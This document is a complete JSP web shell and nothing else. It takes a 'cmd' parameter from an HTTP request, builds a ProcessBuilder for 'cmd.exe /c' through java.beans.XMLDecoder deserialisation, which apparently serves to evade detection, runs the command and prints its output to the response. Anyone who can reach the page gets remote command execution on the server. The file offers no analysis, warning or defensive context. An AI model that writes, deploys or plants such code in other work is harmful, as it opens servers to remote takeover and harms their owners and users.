<%@ page import="java.beans.XMLDecoder" %>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String s = "<object class=\"java.lang.ProcessBuilder\">\n" +
            "<array class=\"java.lang.String\" length=\"3\">\n" +
            "<void index=\"0\">\n" +
            "<string>cmd.exe</string>\n" +
            "</void>\n" +
            "<void index=\"1\">\n" +
            "<string>/c</string>\n" +
            "</void>\n" +
            "<void index=\"2\">\n" +
            "<string>"+cmd+"</string>\n" +
            "</void>\n" +
            "</array>\n" +
            "<void method=\"start\" />\n" +
            "</object>\n";


    XMLDecoder xd = new XMLDecoder(new ByteArrayInputStream(s.getBytes()));
    ProcessBuilder process = (ProcessBuilder) xd.readObject();
    InputStream is = process.start().getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));
    String r = null;
    while((r = bufferedReader.readLine())!=null){
        response.getWriter().println(r);
    }
%>